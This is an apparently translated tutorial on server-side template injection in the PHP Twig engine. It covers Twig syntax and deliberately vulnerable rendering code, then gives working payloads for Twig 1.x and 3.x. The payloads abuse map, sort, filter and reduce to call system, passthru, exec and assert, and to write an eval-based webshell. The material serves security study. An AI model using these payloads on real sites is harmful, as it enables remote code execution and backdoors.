# PHP safe learning—Twig template engine SSTI injection

Author: H3rmesk1t

# Introduction
> 1. Twig is a flexible, fast and secure PHP template language that compiles templates into optimized original PHP code
> 2. Twig has a Sandbox model to detect untrusted template code
> 3. Twig consists of a flexible lexical analyzer and grammatical analyzer that allows developers to define their own tags, filters and create their own DSLs
> 4. Twig is used by many open source projects, such as Symfony, Drupal8, eZPublish, phpBB, Matomo, OroCRM; many frameworks also support Twig, such as Slim, Yii, Laravel, Codeigniter, etc.

# Install
> It is recommended to use composer for installation

```bash
composer requires "twig/twig:^3.0"
```

> After installation, just use Twig's PHP API to call it directly. Let's see a test code below

```php
<?php
require_once __DIR__.'/vendor/autoload.php';

$loader = new \Twig\Loader\ArrayLoader([
    'index' => 'Hello {{ name }}!',
]);
$twig = new \Twig\Environment($loader);

echo $twig->render('index', ['name' => 'whoami']);
```
> In the above code, Twig first uses a loader Twig_Loader_Array to locate the template, and then uses an environment variable Twig_Environment to store configuration information. The render() method loads the template through its first parameter and renders the template through the variable in the second parameter; since the template files are usually stored in the file system, Twig also comes with a file system loader

```php
<?php
require_once __DIR__.'/vendor/autoload.php';

$loader = new \Twig\Loader\FilesystemLoader('./views');
//$loader = new \Twig\Loader\FilesystemLoader('./templates');
$twig = new \Twig\Environment($loader, [
    'cache' => './cache/views', // cache for template files
]);

echo $twig->render('index.html', ['name' => 'whoami']);
```

# Basic syntax of Twig templates
> A template is actually a regular text file, which can generate any text-based format (HTML, XML, CSV, LaTeX, etc.), and it does not have a specific extension: .html, .xml, .twig
> Template contains variables or expressions. These variables or expressions with values ​​will be replaced when evaluating the compilation template. There are also tags that control the template logic.
> Below is a very simple template

```html
<!DOCTYPE html>
<html>
    <head>
        <title>My Webpage</title>
    </head>
    <body>
        <ul id="navigation">
        {% for item in navigation %}
            <li><a href="{{ item.href }}">{{ item.caption }}</a></li>
        {% endfor %}
        </ul>

        <h1>My Webpage</h1>
        {{ a_variable }}
    </body>
</html>
```

> As can be seen from the above code, there are two forms of separators: {% ... %} and {{ ... }}, the former is used to execute statements (such as for loops), and the latter is used to output the results of expressions into templates

## Variable
> The application passes variables into a template for processing. Variables can contain accessible attributes or elements. You can use `.` to access properties in a variable (properties of a method or PHP object or PHP array units), or you can use the so-called "subscript" syntax `[]`

```php
{{ foo.bar }}
{{ foo['bar'] }}
```

## Set variables
> You can assign values ​​to variables in template code blocks, and use the set tag to assign values.

```php
{% set foo = 'foo' %}
{% set foo = [1, 2] %}
{% set foo = {'foo': 'bar'} %}
```

## Filter
> The variables in the template can be modified through the filter `filters`, separated by the variables and filters or multiple filters in the filter, and optional parameters can be added to the brackets to connect multiple filters. The output of one of the filters will be used in the next filter. [Twig built-in filter reference link](https://twig.symfony.com/doc/3.x/filters/index.html)

```php
# The following example of the filter strips the HTML tag in the string variable name and converts it into a format that starts with capital letters

{{ name|striptags|title }}
// {{ '<a>whoami<a>'|striptags|title }}
// Output: Whoami!

# The following filter will receive a sequence list and then use the delimiter specified in the join to merge the items in the sequence into a string

{{ list|join }}
{{ list|join(', ') }}
// {{ ['a', 'b', 'c']|join }}
// Output: abc
// {{ ['a', 'b', 'c']|join('|') }}
// Output: a|b|c
```

## Function
> In the Twig template, you can directly call functions for production content, [Twig built-in function reference link](https://twig.symfony.com/doc/3.x/functions/index.html)

```php
# The range() function is called as follows to return a list containing integer arithmetic sequences

{% for i in range(0, 3) %}
    {{ i }},
{% endfor %}
// Output: 0, 1, 2, 3,
```

## Control structure
> Control structure refers to all control statements that control program flow if, elseif, else, for, program block, etc. The control structure appears in the {% ... %} block, [Twig Tags Reference Link](https://twig.symfony.com/doc/3.x/tags/index.html)

```php
# For example, looping with the for tag

<h1>Members</h1>
<ul>
    {% for user in users %}
        <li>{{ user.username|e }}</li>
    {% endfor %}
</ul>

# if tags can be used to test expressions

{% if users|length > 0 %}
    <ul>
        {% for user in users %}
            <li>{{ user.username|e }}</li>
        {% endfor %}
    </ul>
{% endif %}
```

## Comments
> To comment a line in a template, use the comment syntax {# ...#}

```php
{# note: disabled template because we no longer use this
    {% for user in users %}
        ...
    {% endfor %}
#}
```

## Introduce other templates
> The include function provided by Twig makes it easier for you to introduce a template into a template and return the rendered content of the template to the current template.

```php
{{ include('sidebar.html') }}
```

# Twig template injection
> Like other template injections Twig template injection also occurs when directly using user input as templates

```php
<?php
require_once __DIR__.'/vendor/autoload.php';

$loader = new \Twig\Loader\ArrayLoader();
$twig = new \Twig\Environment($loader);

$template = $twig->createTemplate("Hello {$_GET['name']}!");

echo $template->render();
```

```php
<?php
require_once __DIR__.'/vendor/autoload.php';

$loader = new \Twig\Loader\ArrayLoader([
    'index' => 'Hello {{ name }}!',
]);
$twi
g = new \Twig\Environment($loader);

echo $twig->render('index', ['name' => 'whoami']);
```

> In the first code above, `$_GET['name']` is injected when creatingTemplate, which will trigger template injection, while the second code will not, because the template engine parses `{{name}}` in string constants, rather than dynamically spliced ​​`$_GET["name"]`

## Twig 1.x
> The test code is as follows

```php
<?php

include __DIR__.'/vendor/twig/twig/lib/Twig/Autoloader.php';
Twig_Autoloader::register();

$loader = new Twig_Loader_String();
$twig = new Twig_Environment($loader);
echo $twig->render($_GET['name']);
?>
```

> There are three global variables in Twig 1.x
```php
_self: Reference the instance of the current template
_context: Reference the current context
_charset: Reference the current character set
```

> The corresponding code is

```php
protected $specialVars = [
        '_self' => '$this',
        '_context' => '$context',
        '_charset' => '$this->env->getCharset()',
    ];
```
> This is mainly to use the `_self` variable, which will return the current `\Twig\Template` instance and provide the `env` attribute pointing to `Twig_Environment`, so that you can continue to call other methods in `Twig_Environment` to perform SSTI
> For example, the following Payload can call the `setCache` method to change the path of Twig loading PHP files. When the `allow_url_include` is enabled, you can change the path to achieve remote file inclusion by changing the path.

```php
{{_self.env.setCache("ftp://attackTarget:1234")}}{{_self.env.loadTemplate("backdoor")}}
```

> There is also the `call_user_func` method in the getFilter method. Payload: `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("calc.exe")}}` (However, after Twig2.x and Twig3.x, the effect of `_self` has changed and can only return the current instance name string, so this Payload is only applicable to Twig1.x)

```php
public function getFilter($name)
    {
        if (null === $this->filters) {
            $this->loadFilters();
        }

        if (isset($this->filters[$name])) {
            return $this->filters[$name];
        }

        foreach ($this->filterCallbacks as $callback) {
            if (false !== $filter = call_user_func($callback, $name)) {
                return $filter;
            }
        }

        return false;
    }
```

<img src="./images/1.png" alt="">

## Twig 2.x && Twig 3.x
> Test code

```php
<?php
require_once __DIR__.'/vendor/autoload.php';

$loader = new \Twig\Loader\ArrayLoader();
$twig = new \Twig\Environment($loader);

$template = $twig->createTemplate("Hello {$_GET['name']}!");

echo $template->render();
```

> The `__self` variable in Twig 2.x/3.x version has long lost its function in SSTI, but it can be achieved with some filters in the new version

### map filter
> The map filter in Twig 3.x allows the user to pass an arrow function and apply this arrow function to the sequence or mapped elements

```php
{% set people = [
    {first: "Bob", last: "Smith"},
    {first: "Alice", last: "Dupond"},
] %}

{{ people|map(p => "#{p.first} #{p.last}")|join(', ') }}
// Output: outputs Bob Smith, Alice Dupond


{% set people = {
    "Bob": "Smith",
    "Alice": "Dupond",
} %}

{{ people|map((last, first) => "#{first} #{last}")|join(', ') }}
// Output: outputs Bob Smith, Alice Dupond
```

> When using map as follows

```php
{{["Mark"]|map((arg)=>"Hello #{arg}!")}}
```

> Twig 3.x will compile it to

```php
twig_array_map([0 => "Mark"], function ($__arg__) use ($context, $macros) { $context["arg"] = $__arg__; return ("hello " . ($context["arg"] ?? null))})
```

> Let's see how this method is executed in the source code

```php
function twig_array_map($array, $arrow)
{
    $r = [];
    foreach ($array as $k => $v) {
        $r[$k] = $arrow($v, $k); // Execute $arrow directly as a function
    }

    return $r;
}
```

> From the above code, you can see that the `$arrow` passed in is directly executed as a function, that is, `$arrow($v, $k)`, while `$v` and `$k` are `value` and `key` in `$array` respectively
> And `$array` and `$arrow` are both controllable, so you can directly pass a dangerous function name that can pass in two parameters and can execute commands to implement command execution

```php
system ( string $command [, int &$return_var ] ) : string
passthru ( string $command [, int &$return_var ] )
exec ( string $command [, array &$output [, int &$return_var ]] ) : string
shell_exec ( string $cmd ) : string
```

> The above four methods can reach the first three command execution, and exec is no echo execution

```php
{{["calc"]|map("system")}}
{{["calc"]|map("passthru")}}
{{["calc"]|map("exec")}} // No echo
```

> If the above command execution functions are disabled, you can also execute other functions to execute arbitrary code

```php
{{["phpinfo();"]|map("assert")|join(",")}}
{{{"<?php phpinfo();eval($_POST[H3rmesk1t]);":"/var/www/html/shell.php"}|map("file_put_contents")}} // Write Webshell
```

> Since the map's `$arrow` can be used, then continue to look for filters that should also be used with the $arrow parameter

### sort filter
> This sort filter can be used to sort arrays, and can pass an arrow function to sort arrays

```php
{% for user in users|sort %}
    ...
{% endfor %}


{% set fruits = [
    { name: 'Apples', quantity: 5 },
    { name: 'Ora
nges', quantity: 2 },
    { name: 'Grapes', quantity: 4 },
] %}

{% for fruit in fruits|sort((a, b) => a.quantity <=> b.quantity)|column('name') %}
    {{ fruit }}
{% endfor %}

// Output in this order: Oranges, Grapes, Apples
```

> Similar to map, the twig_sort_filter function will be entered during the template compilation process. The source code of this twig_sort_filter function is as follows

```php
function twig_sort_filter($array, $arrow = null)
{
    if ($array instanceof \Traversable) {
        $array = iterator_to_array($array);
    } elseif (!\is_array($array)) {
        throw new RuntimeError(sprintf('The sort filter only works with arrays or "Traversable", got "%s".', \gettype($array)));
    }

    if (null !== $arrow) {
        uasort($array, $arrow); // is called directly by uasort
    } else {
        asort($array);
    }

    return $array;
}
```

> From the source code, we can see that `$array` and `$arrow` are called directly by the `uasort` function. Since the `uasort` function can use a user-defined comparison function to sort elements in the array by key values. If a dangerous function is customized, it will cause code execution or command execution.

<img src="./images/2.png" alt="">

> Payload

```php
{{["calc", 0]|sort("system")}}
{{["calc", 0]|sort("passthru")}}
{{["calc", 0]|sort("exec")}} // No echo
```

### filter filter
> This filter filter uses an arrow function to filter elements in a sequence or map, which is used to receive the values ​​of the sequence or map.

```php
{% set lists = [34, 36, 38, 40, 42] %}
{{ lists|filter(v => v > 38)|join(', ') }}

// Output: 40, 42
```

> Similar to map, the `twig_array_filter` function will be entered during the template compilation process. The source code of this `twig_array_filter` function is as follows

```php
function twig_array_filter($array, $arrow)
{
    if (\is_array($array)) {
        return array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH); // $array and $arrow are called directly by the array_filter function
    }

    // the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator
    return new \CallbackFilterIterator(new \IteratorIterator($array), $arrow);
}
```

> From the source code, you can see that `$array` and `$arrow` are directly called by the `array_filter` function. The `array_filter` function can use a callback function to filter elements in the array. If you customize a dangerous function, it will cause code execution or command execution.

<img src="./images/3.png" alt="">

> Payload

```php
{{["calc"]|filter("system")}}
{{["calc"]|filter("passthru")}}
{{["calc"]|filter("exec")}} // No echo
{{{"<?php phpinfo();eval($_POST[H3rmesk1t]);":"/var/www/html/shell.php"}|filter("file_put_contents")}} // Write Webshell
```

### reduce filter
> This reduce filter uses an arrow function to iteratively reduce multiple elements in a sequence or map to a single value, which receives the return value of the last iteration and the current value of the sequence or map.

```php
{% set numbers = [1, 2, 3] %}
{{ numbers|reduce((carry, v) => carry + v) }}
// Output: 6
```

> Similar to map, the `twig_array_reduce` function will be entered during the template compilation process. The source code of this `twig_array_reduce` function is as follows

```php
function twig_array_reduce($array, $arrow, $initial = null)
{
    if (!\is_array($array)) {
        $array = iterator_to_array($array);
    }

    return array_reduce($array, $arrow, $initial); // $array, $arrow and $initial are called directly by the array_reduce function
}
```

> From the source code, you can see that `$array` and `$arrow` are called directly by the `array_filter` function. The `array_reduce` function can send values ​​in the array to the user-defined function and return a string. If a dangerous function is customized, it will cause code execution or command execution.

> Payload

```php
{{[0, 0]|reduce("system", "calc")}}
{{[0, 0]|reduce("passthru", "calc")}}
{{[0, 0]|reduce("exec", "calc")}} // No echo
```